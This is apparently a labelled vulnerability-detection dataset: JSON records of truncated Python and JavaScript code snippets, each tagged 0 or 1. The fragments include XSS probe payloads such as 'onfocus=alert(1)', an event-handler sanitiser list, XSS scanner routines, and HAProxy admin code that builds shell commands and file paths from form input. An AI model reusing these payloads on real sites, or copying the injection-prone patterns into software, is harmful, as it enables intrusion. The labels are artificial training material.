\t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value", "label": 0}, {"snippet_id": 32432, "code": " to URL anchors. Gitiles' official documentation about the conversion is at: https://gerrit.googlesource.com/gitiles/+/master/Documentation/markdown.md Args: value: The name of a section that is to be converted", "label": 0}, {"snippet_id": 8679, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url", "label": 0}, {"snippet_id": 46124, "code": "': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': collection_doc.doc.get().can_write(request.user), 'can_edit_index': can_edit_index(request.user), 'is_embeddable': request.GET.get(", "label": 1}, {"snippet_id": 31710, "code": "'group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists') \ttry: \t\tfile=open(list, \"r\") \t\tfile_read=file.read() \t\tfile.close \t\tprint(file_read) \texcept IOError: \t\tprint('<div class=\"alert alert-danger", "label": 0}, {"snippet_id": 17474, "code": "<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 12617, "code": "/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade", "label": 0}, {"snippet_id": 53448, "code": " owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators']: dependencies=Document2", "label": 0}, {"snippet_id": 16603, "code": "'change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment", "label": 0}, {"snippet_id": 30902, "code": "') \t \tif form.getvalue('configver') is None:\t \t\tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" \t\tfunct.get_config(serv, cfg) \telse: \t\tcfg=hap_configs_dir +form.getvalue('configver') \t", "label": 0}, {"snippet_id": 10638, "code": " directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set", "label": 0}, {"snippet_id": 30854, "code": "\tcmd='diff -ub %s%s %s%s' %(hap_configs_dir, left, hap_configs_dir, right)\t \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"]) \ttemplate", "label": 0}, {"snippet_id": 42298, "code": "\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"", "label": 0}, {"snippet_id": 33117, "code": " legacy import swarmbucket_api import access import api import bq import bulkproc import config import expiration import model import notifications import service import swarming import user README_MD=(", "label": 0}, {"snippet_id": 24772, "code": " ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings", "label": 0}, {"snippet_id": 36684, "code": " Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published)", "label": 0}, {"snippet_id": 22505, "code": ", 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$", "label": 0}, {"snippet_id": 4112, "code": "\"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='", "label": 0}, {"snippet_id": 19530, "code": "\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"", "label": 0}, {"snippet_id": 14245, "code": "', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete", "label": 0}, {"snippet_id": 54840, "code": "(UserPassesTestMixin, DeleteView): \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\" model=Article success_url='/' def test_func(self): return self.request.user==self.get_object().author class CommentDelete(UserPassesTestMixin, DeleteView): ", "label": 0}, {"snippet_id": 42867, "code": ") \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get", "label": 0}, {"snippet_id": 5373, "code": " 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart", "label": 0}, {"snippet_id": 49535, "code": ".model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field qs=remote_field.model.objects.filter(pk__in=pks) values=[ SmartFilterValue(self.field_name, obj, str(obj.pk), self", "label": 0}, {"snippet_id": 1105, "code": " headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param==''", "label": 0}, {"snippet_id": 27360, "code": " _JINJA_ENVIRONMENT.filters[name]=fn class JsonEncoder(json.JSONEncoder): \"\"\"Json encoder.\"\"\" _EPOCH=datetime.datetime.utcfromtimestamp(0) def default(self, obj): if isinstance(obj, ndb.Model): dict_obj=obj.to_dict", "label": 0}, {"snippet_id": 45162, "code": ".error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id", "label": 0}, {"snippet_id": 12792, "code": "[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$'", "label": 0}, {"snippet_id": 23256, "code": "<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax',", "label": 0}, {"snippet_id": 9400, "code": "/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 9066, "code": ".views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', ", "label": 0}, {"snippet_id": 35275, "code": " \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html", "label": 0}, {"snippet_id": 31003, "code": "\ttmp_config_path=sql.get_setting('tmp_config_path') \tscript=\"install_keepalived.sh\" \t \tif form.getvalue('hap')==\"1\": \t\tfunct.install_haproxy(master) \t\tfunct.install_haproxy(slave) \t\t \tif form.getvalue('syn_flood", "label": 0}, {"snippet_id": 14899, "code": "-xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs", "label": 0}, {"snippet_id": 11758, "code": "/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name", "label": 0}, {"snippet_id": 34475, "code": "(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value", "label": 0}, {"snippet_id": 27689, "code": ") if not auth.is_current_user_admin() else None) if values['is_logged_in']: values['switch_account_url']=make_login_url(self.request.url) values['logout_url']=make_logout_url(dest_url=self.request.url)", "label": 0}, {"snippet_id": 50488, "code": " signalling that it is about to be closed. Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] try: sess=self.sessionhandler.sessions_from_csessid(csessid)[0] sess.sessionhandler", "label": 0}, {"snippet_id": 37948, "code": " Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe", "label": 0}, {"snippet_id": 16689, "code": "/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses", "label": 1}, {"snippet_id": 11225, "code": "'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd", "label": 0}, {"snippet_id": 35582, "code": ".split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe", "label": 0}, {"snippet_id": 51174, "code": " admin.site.register(PeriodicTask, IEPeriodicTaskAdmin) admin.site.register(CrontabSchedule, IECrontabSchedule) class DashboardUserInline(admin.StackedInline): model=DashboardUser can_delete=False verbose_name_plural", "label": 0}, {"snippet_id": 48286, "code": "\"rid\" not in request.GET: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") u: Profile=get_current_user(request) current_reservation=GroupReservation.objects.get(id=str", "label": 0}, {"snippet_id": 19025, "code": "'instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +", "label": 0}, {"snippet_id": 22864, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 1}, {"snippet_id": 446, "code": ".api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find", "label": 1}, {"snippet_id": 38137, "code": ".title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"", "label": 1}, {"snippet_id": 16058, "code": " urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),", "label": 0}, {"snippet_id": 33652, "code": "=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_(", "label": 0}, {"snippet_id": 28228, "code": "\tfunct.logging(serv, \"config.py edited config\") \texcept: \t\tpass \t\t \tconfig=form.getvalue('config') \toldcfg=form.getvalue('oldconfig') \tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\"", "label": 0}, {"snippet_id": 46061, "code": "=Collection2(request.user, document=collection_doc) except Exception, e: raise PopupException(e, title=_(\"Dashboard does not exist or you don't have the permission to access it.\")) query={'qs':[{'q': ''}], 'fqs':", "label": 0}, {"snippet_id": 9259, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/", "label": 0}, {"snippet_id": 19454, "code": "-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard", "label": 0}, {"snippet_id": 16022, "code": "}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return", "label": 0}, {"snippet_id": 35634, "code": " one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants", "label": 0}, {"snippet_id": 20175, "code": " contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green'", "label": 0}, {"snippet_id": 33281, "code": " @decorators.require_cronjob def get(self): service.unregister_builders() def get_frontend_routes(): endpoints_services=[ legacy_api.BuildBucketApi, config_api.ConfigApi, swarmbucket_api.SwarmbucketApi, ] routes=", "label": 0}, {"snippet_id": 47718, "code": " str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True def recreate_form(reason: str): return redirect('", "label": 0}, {"snippet_id": 43502, "code": "\t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):", "label": 0}, {"snippet_id": 49502, "code": " ] elif type(self.model_field)==BooleanField: values=[ SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in( (1, _('Yes')), (0, _('No')) ) ] elif issubclass(type(self", "label": 0}, {"snippet_id": 13557, "code": "[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name", "label": 0}, {"snippet_id": 22518, "code": ".redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key=", "label": 0}, {"snippet_id": 49324, "code": ".order_field=getattr(field, 'admin_order_field') if callable(field) and getattr(field, 'alters_data', False): raise SmartListException(\"Cannot use a function that alters data in smart list\") except AttributeError", "label": 0}, {"snippet_id": 18398, "code": "/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index", "label": 0}, {"snippet_id": 20465, "code": "=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self", "label": 0}, {"snippet_id": 6376, "code": ".config.get(self.section, 'fticks_format_string') @property def static_dir(self): \"\"\" Directory with static files to be served. \"\"\" return self.config.get(self.section, 'static_dir') @property def ssl_adapter", "label": 0}, {"snippet_id": 31813, "code": "())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists_save') \ttry: \t\twith open(list, \"w\") as file: \t\t\tfile.write(form.getvalue('bwlists_content", "label": 0}, {"snippet_id": 43346, "code": " Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t", "label": 0}, {"snippet_id": 438, "code": "(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='", "label": 0}, {"snippet_id": 49248, "code": ": \".\".join(new_query) }) class SmartColumn(TitleFromModelFieldMixin, object): def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None): self.model", "label": 0}, {"snippet_id": 46004, "code": "[\"temp\"],\"klass\":\"card card-home card-column span10\"}, ] def index(request, is_mobile=False): hue_collections=DashboardController(request.user).get_search_collections() collection_id=request.GET.get('collection", "label": 0}, {"snippet_id": 28309, "code": "\t\t\t\t\tuser=user, \t\t\t\t\t\t\tselect_id=\"serv\", \t\t\t\t\t\t\tserv=serv, \t\t\t\t\t\t\taftersave=aftersave, \t\t\t\t\t\t\tconfig=config_read, \t\t\t\t\t\t\tcfg=cfg, \t\t\t\t\t\t\tselects=servers, \t\t\t\t\t\t\tstderr=stderr, \t\t\t\t\t\t\terror=error, \t\t\t\t\t", "label": 0}, {"snippet_id": 11823, "code": "\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx", "label": 0}, {"snippet_id": 5748, "code": "><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +", "label": 0}, {"snippet_id": 32458, "code": " is used as a replacement character for spaces in the title, typically set to '-'. Since we emulate Gitiles' way of slugification here, it makes little sense to have the separator charactor configurable", "label": 0}, {"snippet_id": 28276, "code": ".upload_and_restart(serv, cfg, just_save=save) \t\t \tfunct.diff_config(oldcfg, cfg) \t \t \t \t \t \t\t \tos.system(\"/bin/rm -f \" +hap_configs_dir +\"*.old\") template=template.render(h2=1, title=\"Working with HAProxy configs\", ", "label": 0}, {"snippet_id": 10283, "code": " the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str", "label": 0}, {"snippet_id": 53584, "code": " kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping", "label": 0}, {"snippet_id": 52965, "code": "[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']", "label": 0}, {"snippet_id": 27175, "code": " hidden_param_name.append(m_input.group(2)) hidden_param_value.append(m_value.group(2)) else: params.append(m_input.group(2)) m_same =re.match(r'.*\\<form\\>\"', line, re.M|re.I) m_action =re.match(r'.*\\<form\\s[^\\", "label": 1}, {"snippet_id": 49797, "code": " socket.emit('sendMSG','Connection Established.') `,1000) } catch{} socket.on('getMSG',function(data){ document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black>[\"+data+\"]</font>\"; try", "label": 1}, {"snippet_id": 47535, "code": "(PlainText('DECT: ')) f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations", "label": 0}, {"snippet_id": 13788, "code": "/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views", "label": 1}, {"snippet_id": 47410, "code": "-avatar' '&payload=' +str(user_id) +'\"><img class=\"button-img\" alt=\"Change avatar\" ' 'src=\"/staticfiles/frontpage/change-avatar.png\"/></a><br />')) else: f.add_content(PlainText('<h3>Add new user</h3>'", "label": 0}, {"snippet_id": 2362, "code": " +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters", "label": 0}, {"snippet_id": 9035, "code": "=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course", "label": 0}, {"snippet_id": 32774, "code": " FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%(num)s</a></td>' '<td class=\"FileContents-lineContents\">%(line)s</td>", "label": 0}, {"snippet_id": 1928, "code": "\"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result", "label": 0}, {"snippet_id": 18068, "code": ", include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url", "label": 0}, {"snippet_id": 43023, "code": ".get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t ", "label": 0}, {"snippet_id": 29178, "code": " \t\tprint('error: '+error) \tos.system(\"rm -f %s\" % script) \t \tstderr=ssh_command(serv, commands, print_out=\"1\") \tif stderr is None: \t\tsql.insert_waf_metrics_enable(serv, \"0\") def check_haproxy_version(serv", "label": 0}, {"snippet_id": 16643, "code": "-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 52996, "code": "'You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials", "label": 1}, {"snippet_id": 13555, "code": "<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views", "label": 0}, {"snippet_id": 23964, "code": " \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('", "label": 0}, {"snippet_id": 49620, "code": ".query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1) ] if self.list_filter else[] def get_columns(self): \"\"\" Transform list_display into list of SmartColumns In list_display", "label": 0}, {"snippet_id": 30715, "code": "-10,18,34-36 | column -s, -t' %(enable, backend, haproxy_sock) \t \tif form.getvalue('save')==\"on\": \t\tsave_command='echo \"show servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) ", "label": 0}, {"snippet_id": 43625, "code": "\t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname", "label": 0}, {"snippet_id": 28775, "code": "=get_config_var('main', 'fullpath') \tssh_enable='' \tssh_port='' \tssh_user_name='' \tssh_user_password='' \t \tfor sshs in sql.select_ssh(serv=serv): \t\tssh_enable=sshs[3] \t\tssh_user_name=sshs[4] \t\tssh_user_password=sshs", "label": 0}, {"snippet_id": 38823, "code": ", BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse", "label": 0}, {"snippet_id": 19540, "code": " BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite", "label": 0}, {"snippet_id": 47026, "code": "=await Comment.cache(comment_id) if comment: asyncio.gather( clear_mc(MC_KEY_COMMENT_LIST % comment.post_id), clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( user_id, comment.post_id)), return_exceptions=True", "label": 0}, {"snippet_id": 45938, "code": ".models import Collection2 from dashboard.conf import get_engines from dashboard.controller import DashboardController, can_edit_index LOG=logging.getLogger(__name__) DEFAULT_LAYOUT=[ {\"size\":2,\"rows\":[{", "label": 0}, {"snippet_id": 43093, "code": ", label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self", "label": 0}, {"snippet_id": 45531, "code": "'editor/list_editor_bundles.mako', request,{ 'bundles': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2", "label": 0}, {"snippet_id": 47352, "code": " Media from..uitools.dataforge import get_csrf_form_element from.magic import get_current_user import logging def render_edit_page(http_request: HttpRequest, action_url: str): user_id=None profile: Profile", "label": 0}, {"snippet_id": 14774, "code": "): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command", "label": 1}, {"snippet_id": 334, "code": "='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads", "label": 1}, {"snippet_id": 50852, "code": "=nocolor) self.client.lineSend(self.csessid,[cmd, args, kwargs]) def send_prompt(self, *args, **kwargs): kwargs[\"options\"].update({\"send_prompt\": True}) self.send_text(*args, **kwargs) def send_default(self,", "label": 0}, {"snippet_id": 42798, "code": "\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields()", "label": 0}, {"snippet_id": 45151, "code": " else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object", "label": 0}, {"snippet_id": 3449, "code": ".insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri", "label": 0}, {"snippet_id": 33396, "code": "'/internal/cron/buildbucket/unregister-builders', UnregisterBuilders), webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\\d+>', notifications.TaskPublishNotification), webapp2.Route( r'/internal", "label": 0}, {"snippet_id": 21373, "code": "<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views", "label": 1}, {"snippet_id": 12798, "code": "-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid", "label": 0}, {"snippet_id": 32529, "code": "(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.bind(self.server_address) class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_GET(self): path=self.path if path.startswith('/chromium", "label": 0}, {"snippet_id": 53790, "code": "=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str", "label": 1}, {"snippet_id": 45135, "code": "=request.GET.get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user", "label": 0}, {"snippet_id": 41742, "code": "\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: 